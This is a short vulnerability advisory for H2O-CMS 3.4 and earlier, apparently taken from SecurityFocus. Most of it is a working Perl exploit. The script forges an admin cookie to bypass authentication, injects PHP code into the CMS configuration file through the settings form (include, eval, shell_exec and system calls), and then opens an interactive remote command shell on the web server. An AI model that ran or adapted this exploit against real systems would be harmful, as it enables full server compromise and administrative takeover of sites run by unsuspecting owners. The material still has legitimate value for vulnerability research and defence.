source: http://www.securityfocus.com/bid/31961/info


H2O-CMS is prone to a PHP code-injection vulnerability and a cookie authentication-bypass vulnerability.

An attacker can exploit the PHP code-injection issue to inject and execute arbitrary malicious PHP code in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.

Attackers can exploit the cookie authentication-bypass vulnerability to gain administrative access; this may aid in further attacks.

Versions up to and including H2O-CMS 3.4 are vulnerable.

#!/usr/bin/perl 
# ---------------------------------------------------------- 
# H2O-CMS <= 3.4 Remote Command Execution Exploit (mq = Off)
# Discovered By StAkeR[at]hotmail[dot]it
# Download On http://sourceforge.net/projects/h2o-cms
# ---------------------------------------------------------- 

use strict;
use LWP::UserAgent;
use LWP::Simple;

my $post;
my $sysc;
my $host = shift or athos();
my $auth = "user=admin&id=1&admin=1";
my $http = new LWP::UserAgent;

my $write = {
              'site_title'  => '";""; error_reporting(0); echo"//athos"; "',
              'db_server'   => '";""; include($_REQUEST["i"]); "',
              'db_name'     => '";""; eval($_REQUEST["g"]); "',
              'db_username' => '";""; echo shell_exec($_REQUEST["c"]); "',
              'db_password' => '";""; echo system($_REQUEST["s"]); "',
              'save'        => 'Save',
            };


$http->default_header('Cookie' => $auth);
$post = $http->post($host.'/index.php?option=SaveConfig',$write);

    
sub start_exec
{  
   my $site = shift @_;
   my $exec = shift @_;
   my $view = get($site.'/includes/config.php?c='.$exec);
   
   return $view;
}   

sub athos
{
   print STDOUT "# Usage: perl $0 http://[host]\n";
   print STDOUT "# Remote Command Execution Exploit\n";
   exit;
}

unless(get($host) =~ /\/\/athos/i)
{
   print STDOUT "# Exploit Failed!\n";
   exit;
}
else
{
  while(1)
  {
     if(defined start_exec($host,$sysc))
     {
        print STDOUT "[athos-shell] ~# "; 
        chomp($sysc = <STDIN>);
      
        print STDOUT "[athos-shell] ~# ".start_exec($host,$sysc)."\n";
     }             
  }
}

__END__